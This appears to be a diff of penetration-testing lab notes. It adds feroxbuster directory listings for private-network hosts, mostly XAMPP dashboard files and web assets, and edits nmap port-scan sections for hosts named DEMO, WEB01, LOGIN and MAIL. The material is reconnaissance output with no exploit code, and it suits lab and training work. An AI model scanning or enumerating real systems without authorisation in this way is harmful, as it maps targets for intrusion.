+http://192.168.146.247/Css/styles.css
+http://192.168.146.247/dashboard/stylesheets/all.css
+http://192.168.146.247/dashboard/docs/create-framework-project-zf2.pdf
+http://192.168.146.247/dashboard/stylesheets/all-rtl.css
+http://192.168.146.247/dashboard/javascripts/all.js
+http://192.168.146.247/dashboard/docs/troubleshoot-apache.pdf
+http://192.168.146.247/PDFs/WelcomeLetter.pdf
+http://192.168.146.247/PDFs/New-Hire-Form.pdf
+http://192.168.146.247/PDFs/Mission.pdf
+http://192.168.146.247/PDFs/Policies%20(2).pdf
+http://192.168.146.247/IMG/module_table_top.png
+http://192.168.146.247/IMG/module_table_bottom.png
+http://192.168.146.247/Img/module_table_bottom.png
+http://192.168.146.247/Img/module_table_top.png
+http://192.168.146.247/dashboard/docs/create-framework-project-zf1.html
+http://192.168.146.247/dashboard/docs/configure-wildcard-subdomains.html
+http://192.168.146.247/dashboard/
+http://192.168.146.247/dashboard/Images/fastly-logo@2x.png
+http://192.168.146.247/dashboard/Images/social-icons-large.png
+http://192.168.146.247/dashboard/Images/sourceforge-logo@2x.png
+http://192.168.146.247/dashboard/docs/configure-use-tomcat.pdf
+http://192.168.146.247/dashboard/es/
+http://192.168.146.247/dashboard/it/
+http://192.168.146.247/dashboard/pl/
+http://192.168.146.247/dashboard/de/
+http://192.168.146.247/dashboard/tr/
+http://192.168.146.247/dashboard/ro/
+http://192.168.146.247/dashboard/Docs/access-phpmyadmin-remotely.html
+http://192.168.146.247/dashboard/Docs/change-mysql-temp-dir.html
+http://192.168.146.247/dashboard/Docs/use-sqlite.pdfmarks
+http://192.168.146.247/dashboard/Docs/increase-php-file-upload-limit.html
+http://192.168.146.247/dashboard/Docs/auto-start-xampp.html
+http://192.168.146.247/dashboard/Docs/use-php-fcgi.pdf
+http://192.168.146.247/dashboard/Docs/use-different-php-version.pdfmarks
+http://192.168.146.247/dashboard/Docs/deploy-git-app.html
+http://192.168.146.247/dashboard/Docs/configure-use-tomcat.html
+http://192.168.146.247/dashboard/Docs/troubleshoot-apache.html
+http://192.168.146.247/dashboard/Docs/create-framework-project-zf1.html
+http://192.168.146.247/dashboard/Docs/create-framework-project-zf2.html
+http://192.168.146.247/dashboard/Docs/change-mysql-temp-dir.pdf
+http://192.168.146.247/dashboard/Docs/reset-mysql-password.html
+http://192.168.146.247/dashboard/Docs/change-mysql-temp-dir.pdfmarks
+http://192.168.146.247/dashboard/Docs/activate-use-xdebug.pdf
+http://192.168.146.247/dashboard/Docs/use-php-fcgi.pdfmarks
+http://192.168.146.247/dashboard/Docs/configure-wildcard-subdomains.pdfmarks
+http://192.168.146.247/dashboard/Docs/deploy-git-app.pdfmarks
+http://192.168.146.247/dashboard/Docs/troubleshoot-apache.pdfmarks
+http://192.168.146.247/dashboard/Docs/use-sqlite.html
+http://192.168.146.247/dashboard/Docs/increase-php-file-upload-limit.pdf
+http://192.168.146.247/dashboard/Docs/install-wordpress.html
+http://192.168.146.247/dashboard/Docs/auto-start-xampp.pdf
+http://192.168.146.247/dashboard/Docs/configure-use-tomcat.pdfmarks
+http://192.168.146.247/dashboard/Docs/activate-use-xdebug.html
+http://192.168.146.247/dashboard/Docs/use-different-php-version.pdf
+http://192.168.146.247/dashboard/Docs/transfer-files-ftp.html
+http://192.168.146.247/dashboard/Docs/send-mail.html
+http://192.168.146.247/dashboard/Docs/use-sqlite.pdf
+http://192.168.146.247/dashboard/Docs/install-wordpress.pdfmarks
+http://192.168.146.247/dashboard/Docs/configure-vhosts.pdfmarks
+http://192.168.146.247/dashboard/Docs/send-mail.pdfmarks
+http://192.168.146.247/dashboard/Docs/access-phpmyadmin-remotely.pdf
+http://192.168.146.247/dashboard/Docs/transfer-files-ftp.pdfmarks
+http://192.168.146.247/dashboard/Docs/activate-use-xdebug.pdfmarks
+http://192.168.146.247/dashboard/Docs/reset-mysql-password.pdfmarks
+http://192.168.146.247/dashboard/Docs/use-different-php-version.html
+http://192.168.146.247/dashboard/Docs/access-phpmyadmin-remotely.pdfmarks
+http://192.168.146.247/dashboard/Docs/create-framework-project-zf1.pdf
+http://192.168.146.247/dashboard/Docs/reset-mysql-password.pdf
+http://192.168.146.247/dashboard/Docs/create-framework-project-zf2.pdf
+http://192.168.146.247/dashboard/Docs/backup-restore-mysql.html
+http://192.168.146.247/dashboard/Docs/use-php-fcgi.html
+http://192.168.146.247/dashboard/Docs/configure-wildcard-subdomains.html
+http://192.168.146.247/dashboard/Docs/increase-php-file-upload-limit.pdfmarks
+http://192.168.146.247/dashboard/Docs/configure-vhosts.html
+http://192.168.146.247/dashboard/Docs/create-framework-project-zf2.pdfmarks
+http://192.168.146.247/dashboard/Docs/create-framework-project-zf1.pdfmarks
+http://192.168.146.247/dashboard/Docs/auto-start-xampp.pdfmarks
+http://192.168.146.247/dashboard/Docs/backup-restore-mysql.pdfmarks
+http://192.168.146.247/dashboard/Docs/backup-restore-mysql.pdf
+http://192.168.146.247/dashboard/Docs/transfer-files-ftp.pdf
+http://192.168.146.247/dashboard/Docs/deploy-git-app.pdf
+http://192.168.146.247/dashboard/Docs/configure-wildcard-subdomains.pdf
+http://192.168.146.247/dashboard/Docs/send-mail.pdf
+http://192.168.146.247/dashboard/Docs/troubleshoot-apache.pdf
+http://192.168.146.247/dashboard/Docs/install-wordpress.pdf
+http://192.168.146.247/dashboard/Docs/configure-use-tomcat.pdf
+http://192.168.146.247/dashboard/hu/
+http://192.168.146.247/dashboard/Docs/configure-vhosts.pdf
+http://192.168.146.247/dashboard/IMAGES/social-icons-large@2x.png
+http://192.168.146.247/dashboard/IMAGES/linux-logo.png
+http://192.168.146.247/dashboard/IMAGES/stack-icons@2x.png
+http://192.168.146.247/dashboard/IMAGES/social-icons.png
+http://192.168.146.247/dashboard/IMAGES/fastly-logo@2x.png
+http://192.168.146.247/dashboard/IMAGES/xampp-newsletter-logo.png
+http://192.168.146.247/dashboard/IMAGES/favicon.png
+http://192.168.146.247/dashboard/IMAGES/sourceforge-logo.png
+http://192.168.146.247/dashboard/IMAGES/apple-logo.png
+http://192.168.146.247/dashboard/IMAGES/social-icons-large.png
+http://192.168.146.247/dashboard/IMAGES/fastly-logo.png
+http://192.168.146.247/dashboard/IMAGES/windows-logo.png
+http://192.168.146.247/dashboard/IMAGES/middleman.png
+http://192.168.146.247/dashboard/IMAGES/addons-video-thumb.png
+http://192.168.146.247/dashboard/IMAGES/pdf-icon.png
+http://192.168.146.247/dashboard/IMAGES/xampp-logo.svg
+http://192.168.146.247/dashboard/IMAGES/stack-icons.png
+http://192.168.146.247/dashboard/IMAGES/social-icons@2x.png
+http://192.168.146.247/dashboard/IMAGES/background.png
+http://192.168.146.247/dashboard/IMAGES/sourceforge-logo@2x.png
+http://192.168.146.247/dashboard/IMAGES/xampp-cloud@2x.png
+http://192.168.146.247/dashboard/IMAGES/bitnami-xampp.png
+http://192.168.146.247/dashboard/IMAGES/xampp-cloud.png
+http://192.168.146.247/dashboard/IMAGES/twitter-bird.png
+http://192.168.146.247/dashboard/FR/
+http://192.168.146.247/dashboard/IT/
+http://192.168.146.247/dashboard/DE/
+http://192.168.146.247/dashboard/StyleSheets/normalize.css
+http://192.168.146.247/dashboard/StyleSheets/asciidoctor.css
+http://192.168.146.247/dashboard/StyleSheets/all.css
+http://192.168.146.247/Dashboard/images/windows-logo.png
+http://192.168.146.247/Dashboard/images/linux-logo.png
+http://192.168.146.247/Dashboard/images/fastly-logo@2x.png
+http://192.168.146.247/Dashboard/images/sourceforge-logo@2x.png
+http://192.168.146.247/Dashboard/images/favicon.png
+http://192.168.146.247/Dashboard/images/xampp-cloud.png
+http://192.168.146.247/Dashboard/images/middleman.png
+http://192.168.146.247/Dashboard/images/sourceforge-logo.png
+http://192.168.146.247/dashboard/StyleSheets/all-rtl.css
+http://192.168.146.247/Dashboard/docs/transfer-files-ftp.pdfmarks
+http://192.168.146.247/Dashboard/docs/troubleshoot-apache.html
+http://192.168.146.247/Dashboard/docs/send-mail.html
+http://192.168.146.247/Dashboard/docs/create-framework-project-zf2.html
+http://192.168.146.247/Dashboard/docs/use-sqlite.pdfmarks
+http://192.168.146.247/Dashboard/docs/activate-use-xdebug.html
+http://192.168.146.247/Dashboard/docs/activate-use-xdebug.pdfmarks
+http://192.168.146.247/Dashboard/docs/increase-php-file-upload-limit.pdf
+http://192.168.146.247/Dashboard/docs/create-framework-project-zf1.pdfmarks
+http://192.168.146.247/Dashboard/docs/use-sqlite.html
+http://192.168.146.247/Dashboard/docs/create-framework-project-zf2.pdfmarks
+http://192.168.146.247/Dashboard/docs/access-phpmyadmin-remotely.pdfmarks
+http://192.168.146.247/Dashboard/docs/deploy-git-app.html
+http://192.168.146.247/Dashboard/docs/transfer-files-ftp.html
+http://192.168.146.247/Dashboard/docs/backup-restore-mysql.html
+http://192.168.146.247/Dashboard/docs/access-phpmyadmin-remotely.html
+http://192.168.146.247/Dashboard/docs/reset-mysql-password.pdfmarks
+http://192.168.146.247/Dashboard/docs/reset-mysql-password.html
+http://192.168.146.247/Dashboard/docs/change-mysql-temp-dir.pdfmarks
+http://192.168.146.247/Dashboard/docs/use-different-php-version.html
+http://192.168.146.247/Dashboard/docs/use-sqlite.pdf
+http://192.168.146.247/Dashboard/docs/send-mail.pdf
+http://192.168.146.247/Dashboard/docs/create-framework-project-zf1.pdf
+http://192.168.146.247/Dashboard/docs/use-php-fcgi.pdf
+http://192.168.146.247/Dashboard/docs/install-wordpress.html
+http://192.168.146.247/Dashboard/docs/configure-use-tomcat.pdfmarks
+http://192.168.146.247/Dashboard/docs/auto-start-xampp.html
+http://192.168.146.247/Dashboard/docs/increase-php-file-upload-limit.pdfmarks
+http://192.168.146.247/Dashboard/docs/configure-vhosts.html
+http://192.168.146.247/Dashboard/docs/troubleshoot-apache.pdfmarks
+http://192.168.146.247/Dashboard/docs/backup-restore-mysql.pdfmarks
+http://192.168.146.247/Dashboard/docs/configure-use-tomcat.html
+http://192.168.146.247/Dashboard/docs/configure-use-tomcat.pdf
+http://192.168.146.247/Dashboard/docs/activate-use-xdebug.pdf
+http://192.168.146.247/Dashboard/docs/deploy-git-app.pdf
+http://192.168.146.247/Dashboard/docs/create-framework-project-zf2.pdf
+http://192.168.146.247/Dashboard/docs/transfer-files-ftp.pdf
+http://192.168.146.247/Dashboard/docs/install-wordpress.pdf
+http://192.168.146.247/Dashboard/Images/apple-logo.png
+http://192.168.146.247/Dashboard/Images/fastly-logo@2x.png
+http://192.168.146.247/Dashboard/Images/middleman.png
+http://192.168.146.247/Dashboard/Images/windows-logo.png
+http://192.168.146.247/Dashboard/Images/xampp-newsletter-logo.png
+http://192.168.146.247/Dashboard/Images/xampp-cloud@2x.png
+http://192.168.146.247/Dashboard/Images/social-icons.png
+http://192.168.146.247/Dashboard/Images/bitnami-xampp.png
+http://192.168.146.247/Dashboard/Images/pdf-icon.png
+http://192.168.146.247/Dashboard/Images/social-icons@2x.png
+http://192.168.146.247/Dashboard/es/
+http://192.168.146.247/Dashboard/it/
+http://192.168.146.247/dashboard/ur/
+http://192.168.146.247/dashboard/Stylesheets/normalize.css
+http://192.168.146.247/dashboard/Stylesheets/asciidoctor.css
+http://192.168.146.247/dashboard/Stylesheets/all.css
+http://192.168.146.247/Dashboard/Docs/use-different-php-version.pdfmarks
+http://192.168.146.247/Dashboard/Docs/auto-start-xampp.html
+http://192.168.146.247/Dashboard/Docs/change-mysql-temp-dir.pdf
+http://192.168.146.247/Dashboard/Docs/use-php-fcgi.pdfmarks
+http://192.168.146.247/Dashboard/Docs/reset-mysql-password.html
+http://192.168.146.247/Dashboard/Docs/increase-php-file-upload-limit.pdf
+http://192.168.146.247/Dashboard/Docs/backup-restore-mysql.html
+http://192.168.146.247/Dashboard/Docs/install-wordpress.pdfmarks
+http://192.168.146.247/Dashboard/Docs/configure-vhosts.html
+http://192.168.146.247/Dashboard/Docs/reset-mysql-password.pdfmarks
+http://192.168.146.247/Dashboard/Docs/use-sqlite.html
+http://192.168.146.247/Dashboard/Docs/deploy-git-app.pdfmarks
+http://192.168.146.247/Dashboard/Docs/deploy-git-app.html
+http://192.168.146.247/Dashboard/Docs/use-php-fcgi.html
+http://192.168.146.247/Dashboard/Docs/create-framework-project-zf1.html
+http://192.168.146.247/Dashboard/Docs/access-phpmyadmin-remotely.html
+http://192.168.146.247/Dashboard/Docs/activate-use-xdebug.pdfmarks
+http://192.168.146.247/Dashboard/Docs/change-mysql-temp-dir.html
+http://192.168.146.247/Dashboard/Docs/auto-start-xampp.pdfmarks
+http://192.168.146.247/Dashboard/Docs/send-mail.pdfmarks
+http://192.168.146.247/Dashboard/Docs/create-framework-project-zf1.pdfmarks
+http://192.168.146.247/Dashboard/Docs/increase-php-file-upload-limit.html
+http://192.168.146.247/Dashboard/Docs/configure-use-tomcat.html
+http://192.168.146.247/Dashboard/Docs/install-wordpress.html
+http://192.168.146.247/Dashboard/Docs/configure-vhosts.pdfmarks
+http://192.168.146.247/Dashboard/Docs/create-framework-project-zf2.pdfmarks
+http://192.168.146.247/Dashboard/Docs/change-mysql-temp-dir.pdfmarks
+http://192.168.146.247/Dashboard/Docs/configure-wildcard-subdomains.html
+http://192.168.146.247/Dashboard/Docs/configure-wildcard-subdomains.pdfmarks
+http://192.168.146.247/Dashboard/Docs/use-php-fcgi.pdf
+http://192.168.146.247/Dashboard/Docs/activate-use-xdebug.html
+http://192.168.146.247/Dashboard/Docs/access-phpmyadmin-remotely.pdfmarks
+http://192.168.146.247/Dashboard/Docs/use-different-php-version.pdf
+http://192.168.146.247/Dashboard/Docs/create-framework-project-zf1.pdf
+http://192.168.146.247/Dashboard/Docs/activate-use-xdebug.pdf
+http://192.168.146.247/Dashboard/Docs/use-sqlite.pdf
+http://192.168.146.247/Dashboard/Docs/auto-start-xampp.pdf
+http://192.168.146.247/Dashboard/Docs/deploy-git-app.pdf
+http://192.168.146.247/Dashboard/Docs/backup-restore-mysql.pdfmarks
+http://192.168.146.247/Dashboard/Docs/use-sqlite.pdfmarks
+http://192.168.146.247/Dashboard/Docs/transfer-files-ftp.html
+http://192.168.146.247/Dashboard/Docs/send-mail.html
+http://192.168.146.247/Dashboard/Docs/troubleshoot-apache.pdfmarks
+http://192.168.146.247/Dashboard/Docs/access-phpmyadmin-remotely.pdf
+http://192.168.146.247/Dashboard/Docs/troubleshoot-apache.html
+http://192.168.146.247/Dashboard/Docs/use-different-php-version.html
+http://192.168.146.247/Dashboard/Docs/configure-use-tomcat.pdfmarks
+http://192.168.146.247/Dashboard/Docs/increase-php-file-upload-limit.pdfmarks
+http://192.168.146.247/Dashboard/Docs/transfer-files-ftp.pdfmarks
+http://192.168.146.247/Dashboard/Docs/create-framework-project-zf2.pdf
+http://192.168.146.247/Dashboard/Docs/configure-wildcard-subdomains.pdf
+http://192.168.146.247/Dashboard/Docs/configure-vhosts.pdf
+http://192.168.146.247/Dashboard/Docs/transfer-files-ftp.pdf
+http://192.168.146.247/Dashboard/Docs/reset-mysql-password.pdf
+http://192.168.146.247/Dashboard/Docs/backup-restore-mysql.pdf
+http://192.168.146.247/Dashboard/Docs/configure-use-tomcat.pdf
+http://192.168.146.247/Dashboard/Docs/create-framework-project-zf2.html
+http://192.168.146.247/Dashboard/Docs/troubleshoot-apache.pdf
+http://192.168.146.247/Dashboard/Docs/install-wordpress.pdf
+http://192.168.146.247/Dashboard/Docs/send-mail.pdf
+http://192.168.146.247/Dashboard/DE/
+http://192.168.146.247/Dashboard/IMAGES/sourceforge-logo@2x.png
+http://192.168.146.247/Dashboard/IMAGES/linux-logo.png
+http://192.168.146.247/Dashboard/IMAGES/addons-video-thumb.png
+http://192.168.146.247/Dashboard/IMAGES/social-icons-large.png
+http://192.168.146.247/Dashboard/IMAGES/social-icons.png
+http://192.168.146.247/Dashboard/IMAGES/favicon.png
+http://192.168.146.247/Dashboard/IMAGES/xampp-cloud.png
+http://192.168.146.247/Dashboard/IMAGES/pdf-icon.png
+http://192.168.146.247/Dashboard/IMAGES/stack-icons@2x.png
+http://192.168.146.247/Dashboard/IT/
+http://192.168.146.247/Dashboard/ur/
+http://192.168.146.247/Dashboard/StyleSheets/normalize.css
+http://192.168.146.247/Dashboard/StyleSheets/asciidoctor.css
+http://192.168.146.247/Dashboard/StyleSheets/all-rtl.css
+http://192.168.146.247/Dashboard/StyleSheets/all.css
+http://192.168.146.247/dashboard/DOCS/Images/
+http://192.168.146.247/Pdfs/WelcomeLetter.pdf
+http://192.168.146.247/Pdfs/New-Hire-Form.pdf
+http://192.168.146.247/Pdfs/Mission.pdf
+http://192.168.146.247/dashboard/pt_BR/
+http://192.168.146.247/WEBALIZER/
+http://192.168.146.247/dashboard/zh_tw/
+
+```
 ## 246 DEMO
 ### open ports
 ```
@@ -493,7 +1283,7 @@ Open 192.168.102.246:80
 Open 192.168.102.246:443
 Open 192.168.102.246:2222
 ```
-### details
+### port details
 ```
 PORT     STATE SERVICE  REASON         VERSION
 80/tcp   open  http     syn-ack ttl 61 Apache httpd 2.4.52 ((Ubuntu))
@@ -560,6 +1350,15 @@ OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
 OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)
 
 ```
+### feroxbuster
+```
+http://192.168.146.246/js/scripts.js
+http://192.168.146.246/js/jquery-1.12.4.min.js
+http://192.168.146.246/css/bootstrap.min.css
+http://192.168.146.246/
+http://192.168.146.246/fonts/glyphicons-halflings-regular.woff
+http://192.168.146.246/submit/
+```
 ## 245  WEB01
 ### open ports
 ```
@@ -568,7 +1367,7 @@ Open 192.168.102.245:80
 Open 192.168.102.245:443
 Open 192.168.102.245:8000
 ```
-### details
+### port details
 ```
 PORT     STATE SERVICE  REASON         VERSION
 21/tcp   open  ftp      syn-ack ttl 61 vsftpd 2.0.8 or later
@@ -746,7 +1545,88 @@ OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
 OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
 OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
 OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)
+```
 
+### feroxbuster
+```
+http://192.168.146.245/js/scripts.js
+http://192.168.146.245/img/clients/client-3.png
+http://192.168.146.245/img/clients/logo-3-dark.png
+http://192.168.146.245/img/clients/logo-7-dark.png
+http://192.168.146.245/img/clients/logo-2-dark.png
+http://192.168.146.245/img/clients/logo-8-dark.png
+http://192.168.146.245/js/plugins/waypoints.min.js
+http://192.168.146.245/img/clients/logo-1-dark.png
+http://192.168.146.245/img/clients/logo-11-dark.png
+http://192.168.146.245/img/assets/logo-white.png
+http://192.168.146.245/css/colors/green.css
+http://192.168.146.245/js/plugins/wow.min.js
+http://192.168.146.245/img/clients/client-2.png
+http://192.168.146.245/img/clients/logo-9-dark.png
+http://192.168.146.245/img/clients/logo-6-dark.png
+http://192.168.146.245/js/plugins/counterup.min.js
+http://192.168.146.245/js/plugins/smoothscroll.min.js
+http://192.168.146.245/img/clients/logo-5-dark.png
+http://192.168.146.245/js/plugins/parallax.min.js
+http://192.168.146.245/css/simple-line-icons.css
+http://192.168.146.245/css/owl.carousel.css
+http://192.168.146.245/js/plugins/easign1.3.min.js
+http://192.168.146.245/img/clients/logo-10-dark.png
+http://192.168.146.245/js/plugins/tweetie.min.js
+http://192.168.146.245/img/assets/logo-dark.png
+http://192.168.146.245/css/no-ui-slider/jquery.nouislider.css
+http://192.168.146.245/img/clients/logo-4-dark.png
+http://192.168.146.245/js/plugins/gmap3.min.js
+http://192.168.146.245/img/clients/client-1.png
+http://192.168.146.245/js/no-ui-slider/jquery.nouislider.all.min.js
+http://192.168.146.245/js/plugins/moderniz.min.js
+http://192.168.146.245/css/font-awesome/css/font-awesome.css
+http://192.168.146.245/bootstrap/js/bootstrap.min.js
+http://192.168.146.245/img/assets/gridtile.png
+http://192.168.146.245/img/assets/marker.png
+http://192.168.146.245/img/assets/cbp-sprite.png
+http://192.168.146.245/img/assets/contact-form-loader.gif
+http://192.168.146.245/img/assets/cbp-loading-popup.gif
+http://192.168.146.245/js/plugins/owlcarousel.min.js
+http://192.168.146.245/img/assets/cbp-loading.gif
+http://192.168.146.245/img/assets/gridtile_white.png
+http://192.168.146.245/img/assets/timer.png
+http://192.168.146.245/js/plugins/cubeportfolio.min.js
+http://192.168.146.245/js/plugins/jquery.min.js
+http://192.168.146.245/img/backgrounds/bg-9.jpg
+http://192.168.146.245/bootstrap/css/bootstrap.min.css
+http://192.168.146.245/css/ionicons.min.css
+http://192.168.146.245/css/style.css
+http://192.168.146.245/css/animate.css
+http://192.168.146.245/css/revolution-slider.css
+http://192.168.146.245/css/cubeportfolio.min.css
+http://192.168.146.245/img/assets/rev-loader.GIF
+http://192.168.146.245/img/backgrounds/bg-5.jpg
+http://192.168.146.245/img/backgrounds/bg-4.jpg
+http://192.168.146.245/img/backgrounds/bg-6.jpg
+http://192.168.146.245/img/backgrounds/bg-7.jpg
+http://192.168.146.245/img/team/team-2.png
+http://192.168.146.245/img/backgrounds/bg-8.jpg
+http://192.168.146.245/js/plugins/revslider.min.js
+http://192.168.146.245/img/team/team-3.png
+http://192.168.146.245/img/team/team-4.png
+http://192.168.146.245/img/backgrounds/bg-2.jpg
+http://192.168.146.245/img/backgrounds/bg.jpg
+http://192.168.146.245/
+http://192.168.146.245/fonts/ionicons.woff
+http://192.168.146.245/img/backgrounds/bg-1.jpg
+http://192.168.146.245/img/team/team-1.png
+http://192.168.146.245/img/backgrounds/bg-3.jpg
+http://192.168.146.245/fonts/Simple-Line-Icons.woff2
+http://192.168.146.245/img/backgrounds/bg-shortcodes.jpg
+http://192.168.146.245/img/backgrounds/bg-home-fullscreen.jpg
+http://192.168.146.245/fonts/Simple-Line-Icons.woff
+http://192.168.146.245/fonts/Simple-Line-Icons.ttf
+http://192.168.146.245/fonts/ionicons.ttf
+http://192.168.146.245/fonts/Simple-Line-Icons.svg
+http://192.168.146.245/fonts/Simple-Line-Icons.eot
+http://192.168.146.245/fonts/ionicons.svg
+http://192.168.146.245/fonts/ionicons.eot
 ```
 ## 191 LOGIN
 ### open ports
@@ -767,7 +1647,7 @@ Open 192.168.102.191:49668
 Open 192.168.102.191:49671
 Open 192.168.102.191:49669
 ```
-### details
+### port details
 ```
 PORT      STATE SERVICE       REASON          VERSION
 80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
@@ -875,6 +1755,9 @@ Host script results:
 |_    Message signing enabled but not required
 
 ```
+### feroxbuster
+```
+```
 ## 189 MAIL
 ### open ports
 ```
@@ -895,7 +1778,7 @@ Open 192.168.102.189:49668
 Open 192.168.102.189:49670
 Open 192.168.102.189:49669
 ```
-### details
+### port details
 ```
 PORT      STATE SERVICE       REASON          VERSION
 25/tcp    open  smtp          syn-ack ttl 125 hMailServer smtpd
